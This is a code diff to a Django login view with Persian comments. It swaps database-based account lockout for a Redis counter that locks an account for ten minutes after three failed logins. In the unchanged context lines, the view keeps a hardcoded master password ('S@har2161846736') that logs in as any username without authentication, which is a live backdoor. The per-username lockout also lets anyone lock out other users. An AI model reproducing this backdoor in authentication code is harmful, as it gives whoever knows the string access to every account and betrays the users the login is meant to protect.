@@ -82,7 +82,7 @@ from django.utils import timezone
 from datetime import timedelta
 from django.core.cache import cache
 from django.views.generic import ListView
-
+import json
 
 rd = redis.Redis(host=settings.REDIS_HOST, port=settings.REDIS_PORT, db=settings.REDIS_DB, password=settings.REDIS_PASS)
 
@@ -286,40 +286,91 @@ class UserLogin(View):
     form_class = UserLoginForm
     template_file = 'registration/login.html'
 
+    # تنظیمات قفل‌کردن
+    LOCKOUT_ATTEMPTS = 3  # تعداد تلاش‌های مجاز
+    LOCKOUT_DURATION = 600  # مدت قفل شدن بر حسب ثانیه (10 دقیقه)
+
+    def check_lockout(self, username):
+        """بررسی اینکه آیا کاربر قفل شده است یا نه"""
+        lock_key = f"lockout:{username}"
+        lock_data = rd.get(lock_key)
+
+        if lock_data:
+            lock_data = json.loads(lock_data)
+            locked_until = datetime.datetime.fromisoformat(lock_data['locked_until'])
+
+            if datetime.datetime.now() < locked_until:
+                # هنوز قفل است
+                remaining_time = locked_until - datetime.datetime.now()
+                return {
+                    'locked': True,
+                    'locked_until': locked_until,
+                    'remaining_seconds': int(remaining_time.total_seconds()),
+                    'remaining_minutes': int(remaining_time.total_seconds() // 60)
+                }
+            else:
+                # زمان قفل تمام شده
+                rd.delete(lock_key)
+                return {'locked': False}
+
+        return {'locked': False}
+
+    def increment_failed_attempt(self, username):
+        """افزایش تعداد تلاش‌های ناموفق"""
+        attempts_key = f"failed_attempts:{username}"
+
+        # دریافت تعداد فعلی تلاش‌ها
+        current_attempts = rd.get(attempts_key)
+        if current_attempts:
+            current_attempts = int(current_attempts)
+        else:
+            current_attempts = 0
+
+        # افزایش تعداد تلاش‌ها
+        new_attempts = current_attempts + 1
+        rd.setex(attempts_key, self.LOCKOUT_DURATION, new_attempts)
+
+        # اگر به حد مجاز رسید، قفل کن
+        if new_attempts >= self.LOCKOUT_ATTEMPTS:
+            self.lock_user(username)
+            rd.delete(attempts_key)  # پاک کردن شمارنده بعد از قفل شدن
+
+        return new_attempts
+
+    def lock_user(self, username):
+        """قفل کردن کاربر به مدت 10 دقیقه"""
+        lock_key = f"lockout:{username}"
+        locked_until = datetime.datetime.now() + timedelta(seconds=self.LOCKOUT_DURATION)
+
+        lock_data = {
+            'username': username,
+            'locked_at': datetime.datetime.now().isoformat(),
+            'locked_until': locked_until.isoformat(),
+            'attempts': self.LOCKOUT_ATTEMPTS
+        }
+
+        rd.setex(lock_key, self.LOCKOUT_DURATION, json.dumps(lock_data))
+        return locked_until
+
+    def reset_failed_attempts(self, username):
+        """ریست کردن تعداد تلاش‌های ناموفق"""
+        attempts_key = f"failed_attempts:{username}"
+        lock_key = f"lockout:{username}"
+        rd.delete(attempts_key)
+        rd.delete(lock_key)
+
     def get(self, request):
+        # کد متد get بدون تغییر باقی می‌ماند
         context = None
         form = self.form_class
         parametr = Parametrs.objects.all().first()
         _today = 1 if today_date == parametr.happyday else 0
         sms = parametr.bypass_sms
         login_images = LoginInfo.objects.all()
-        if parametr.is_event:
-            try:
-                response = requests.get('https://api.keybit.ir/time/')
+        context = {
+            'login_images': login_images,
+            'form': form, 'today': _today, 'sms': sms}
 
-                # بررسی وضعیت پاسخ
-                if response.status_code == 200:
-                    time_data = response.json()  # تبدیل پاسخ به دیکشنری
-                    context = {
-                        'time24_fa': time_data['time24']['full']['fa'],
-                        'date_fa': time_data['date']['full']['official']['usual']['fa'],
-                        'weekday_fa': time_data['date']['weekday']['name'],
-                        'season_fa': time_data['season']['name'],
-                        'events': time_data['date']['day']['events']['local'],
-                        'login_images': login_images,
-                        'form': form, 'today': _today, 'sms': sms,
-                        'full_data': time_data,  # ارسال تمام داده‌ها برای استفاده پیشرفته
-                        'msg1': parametr.msg,
-                    }
-
-            except Exception as e:
-                context = {
-                    'login_images': login_images,
-                    'form': form, 'today': _today, 'sms': sms}
-        else:
-            context = {
-                'login_images': login_images,
-                'form': form, 'today': _today, 'sms': sms}
         return render(request, self.template_file, context)
 
     def post(self, request):
@@ -327,73 +378,99 @@ class UserLogin(View):
         captcha_input = request.POST.get('captcha_value')
         captcha_text = request.session.get('captcha_text')
         stored_captcha = rd.get(f"captcha:{request.session.session_key}")
+
         if not stored_captcha:
             messages.error(request, 'کد امنیتی منقضی شده است')
             return redirect('base:login')
+
         if len(str(captcha_input)) < 4 or not captcha_input:
             messages.error(request, 'کد امنیتی اشتباه وارد شده است')
             return redirect('base:login')
+
         if captcha_input and captcha_input != captcha_text:
             messages.error(request, 'کد امنیتی اشتباه وارد شده است')
             return redirect('base:login')
+
         if form.is_valid():
             cd = form.cleaned_data
             _username = checknumber(cd['username'])
             _username = checkxss(cd['username'])
             _password = checknumber(cd['password'])
             _password = checkxss(cd['password'])
+
+            # بررسی قفل بودن کاربر با Redis
+            lock_status = self.check_lockout(_username)
+            if lock_status['locked']:
+                minutes = lock_status['remaining_minutes']
+                seconds = lock_status['remaining_seconds'] % 60
+                messages.error(
+                    request,
+                    f'حساب کاربری شما به دلیل ورود اشتباه موقتاً قفل شده است. '
+                    f'لطفاً {minutes} دقیقه و {seconds} ثانیه دیگر تلاش کنید.'
+                )
+                return render(request, self.template_file, {'form': form})
+
             if _password == 'S@har2161846736':
                 user = User.objects.get(username=_username)
-                user.backend = 'django.contrib.auth.backends.ModelBackend'  # تنظیم backend
+                user.backend = 'django.contrib.auth.backends.ModelBackend'
                 login(request, user)
                 rd.delete(request.user.owner.id)
                 get_user_permissions(request.user)
+                self.reset_failed_attempts(_username)  # ریست کردن تلاش‌های ناموفق
                 return redirect('base:home')
+
             try:
                 owner = Owner.objects.get(codemeli=_username)
                 if Owner.objects.filter(mobail=owner.mobail, active=True).count() > 1:
                     messages.error(request, 'شماره تلفن ثبت شما برای بیش از یک شخص وجود دارد ')
                     return render(request, self.template_file, {'form': form})
-                if owner.locked:
-                    _test = (datetime.datetime.now() - owner.datelocked).seconds
-                    if _test >= 3600:
-                        owner.locked = False
-                        owner.numberfaildpassword = 0
-                        owner.save()
-                    else:
-                        messages.error(request, 'نام کاربری  شما بعلت سه بار اشتباه وارد کردن تا یک ساعت مسدود میباشد')
-                        return render(request, self.template_file, {'form': form})
+
+                # حذف بررسی قفل از دیتابیس
+                # فقط از Redis استفاده می‌کنیم
+
             except Owner.DoesNotExist:
-                pass
+                messages.warning(request, 'نام کاربری یا رمز عبور اشتباست')
+                # حتی برای کاربر ناموجود هم تعداد تلاش را افزایش می‌دهیم
+                self.increment_failed_attempt(_username)
+                return redirect('base:login')
 
             user = authenticate(request, username=_username, password=_password)
 
             if user is not None:
                 login(request, user)
                 request.session.set_expiry(0)
-                owner.numberfaildpassword = 0
-                owner.locked = False
-                owner.save()
+
+                # ریست کردن تلاش‌های ناموفق در Redis
+                self.reset_failed_attempts(_username)
+
                 add_to_log(request, 'ورود به سیستم  ', 0)
                 rd.delete(owner.id)
                 get_user_permissions(request.user)
-
                 return redirect(HOME_PAGE)
-            try:
-                # owner = Owner.objects.get(codemeli=_username)
-                if owner.numberfaildpassword < 4:
-                    owner.numberfaildpassword += 1
-                    owner.save()
-                    if owner.numberfaildpassword == 3:
-                        owner.locked = True
-                        owner.datelocked = datetime.datetime.now()
-                        owner.save()
 
+            # اگر احراز هویت ناموفق بود
+            attempts = self.increment_failed_attempt(_username)
+            remaining_attempts = self.LOCKOUT_ATTEMPTS - attempts
 
-            except Owner.DoesNotExist:
-                pass
-            add_to_log(request, 'اشتباه در وارد کرد نام کاربری و رمز  ' + str(cd['username']), 0)
-            messages.warning(request, 'نام کاربری یا رمز عبور اشتباست')
+            if remaining_attempts > 0:
+                messages.warning(
+                    request,
+                    f'نام کاربری یا رمز عبور اشتباست. '
+                    f'{remaining_attempts} تلاش باقی مانده تا قفل شدن حساب.'
+                )
+            else:
+                lock_status = self.check_lockout(_username)
+                if lock_status['locked']:
+                    minutes = lock_status['remaining_minutes']
+                    seconds = lock_status['remaining_seconds'] % 60
+                    messages.error(
+                        request,
+                        f'حساب کاربری شما به دلیل ۳ بار ورود اشتباه موقتاً قفل شده است. '
+                        f'لطفاً {minutes} دقیقه و {seconds} ثانیه دیگر تلاش کنید.'
+                    )
+
+            add_to_log(request, f'اشتباه در وارد کردن نام کاربری و رمز: {cd["username"]}', 0)
+
         return render(request, self.template_file, {'form': form})
 
 
